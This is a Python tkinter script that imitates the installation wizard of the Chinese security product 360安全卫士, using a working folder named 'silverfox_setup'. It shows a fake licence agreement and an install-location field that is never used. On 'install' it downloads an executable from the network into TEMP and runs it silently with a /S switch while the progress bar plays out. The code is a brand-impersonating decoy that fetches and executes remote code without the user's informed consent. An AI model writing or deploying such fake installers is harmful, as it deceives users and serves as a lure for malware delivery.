import tkinter as tk
from tkinter import ttk
import threading
import time
import urllib.request
import os

WORK_DIR = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'silverfox_setup')

def download_360():
    urls = [
        "http://dl.360safe.com/desktop/360desktop.exe",
        "https://down.360safe.com/desktop/360desktop.exe",
    ]
    dest = os.path.join(WORK_DIR, "360desktop.exe")
    os.makedirs(WORK_DIR, exist_ok=True)
    for url in urls:
        try:
            urllib.request.urlretrieve(url, dest)
            if os.path.exists(dest) and os.path.getsize(dest) > 100000:
                return dest
        except:
            continue
    return None

def run():
    root = tk.Tk()
    root.title("360安全卫士 安装向导")
    root.geometry("560x420")
    root.resizable(False, False)
    root.attributes('-topmost', True)

    GREEN = "#00a65a"
    top = tk.Frame(root, bg=GREEN, height=90)
    top.pack(fill='x')
    tk.Label(top, text="🛡️ 360安全卫士", font=("微软雅黑", 20, "bold"),
             bg=GREEN, fg="white").place(x=100, y=30)
    c = tk.Canvas(top, width=60, height=60, bg=GREEN, highlightthickness=0)
    c.place(x=20, y=15)
    c.create_oval(5, 5, 55, 55, fill="#ffcc00", outline="")
    c.create_text(30, 30, text="360", font=("Arial", 16, "bold"), fill="white")

    body = tk.Frame(root, bg='white')
    body.pack(fill='both', expand=True, padx=30, pady=20)

    step = 0

    def show_step(idx):
        nonlocal step
        step = idx
        for w in body.winfo_children():
            w.destroy()
        bg = 'white'
        if idx == 0:
            tk.Label(body, text="欢迎使用360安全卫士安装向导", font=("微软雅黑", 14, "bold"),
                     bg=bg, fg="#333").pack(anchor='w', pady=5)
            tk.Label(body, text="本向导将引导您完成360安全卫士的安装。", bg=bg, fg="#666").pack(anchor='w')
            tk.Label(body, text="建议关闭其他应用程序后再继续。", bg=bg, fg="#666").pack(anchor='w')
        elif idx == 1:
            tk.Label(body, text="许可协议", font=("微软雅黑", 14, "bold"), bg=bg, fg="#333").pack(anchor='w', pady=5)
            txt = tk.Text(body, height=8, width=55, bg='#f9f9f9', fg='#333')
            txt.insert('1.0', "360安全卫士最终用户许可协议\n\n请仔细阅读...\n（此处省略协议内容）")
            txt.config(state='disabled')
            txt.pack(pady=5)
            tk.Button(body, text="我同意", bg=GREEN, fg='white', command=lambda: show_step(2)).pack(pady=10)
            return
        elif idx == 2:
            tk.Label(body, text="选择安装位置", font=("微软雅黑", 14, "bold"), bg=bg, fg="#333").pack(anchor='w', pady=5)
            e = tk.Entry(body, width=50)
            e.insert(0, "C:\\Program Files (x86)\\360\\360Safe")
            e.pack(pady=10)
            tk.Button(body, text="浏览...", bg='#e0e0e0', fg='#333').pack()
        elif idx == 3:
            tk.Label(body, text="准备安装", font=("微软雅黑", 14, "bold"), bg=bg, fg="#333").pack(anchor='w', pady=5)
            tk.Label(body, text="单击“安装”开始安装360安全卫士。", bg=bg, fg="#666").pack(anchor='w')
            tk.Button(body, text="安装", bg=GREEN, fg='white', command=start_install).pack(pady=20)

        if idx != 1:
            nav = tk.Frame(body, bg=bg)
            nav.pack(side='bottom', fill='x', pady=20)
            if idx > 0:
                tk.Button(nav, text="< 上一步", command=lambda: show_step(idx-1),
                          bg='#e0e0e0', fg='#333').pack(side='left')
            if idx < 3:
                tk.Button(nav, text="下一步 >", bg=GREEN, fg='white',
                          command=lambda: show_step(idx+1)).pack(side='right')

    def start_install():
        show_step(3)
        progress = ttk.Progressbar(body, orient='horizontal', length=400, mode='determinate')
        progress.pack(pady=20)
        lbl = tk.Label(body, text="正在准备...", bg='white', fg='#333')
        lbl.pack()

        def do():
            lbl.config(text="正在下载360桌面助手...")
            progress['value'] = 20
            root.update()
            path = download_360()
            if not path:
                lbl.config(text="下载失败，跳过...")
            else:
                progress['value'] = 60
                lbl.config(text="正在安装...")
                root.update()
                os.system(f'"{path}" /S')
            progress['value'] = 100
            lbl.config(text="安装完成！")
            root.update()
            time.sleep(1)
            root.destroy()

        threading.Thread(target=do, daemon=True).start()

    show_step(0)
    root.mainloop()

if __name__ == "__main__":
    run()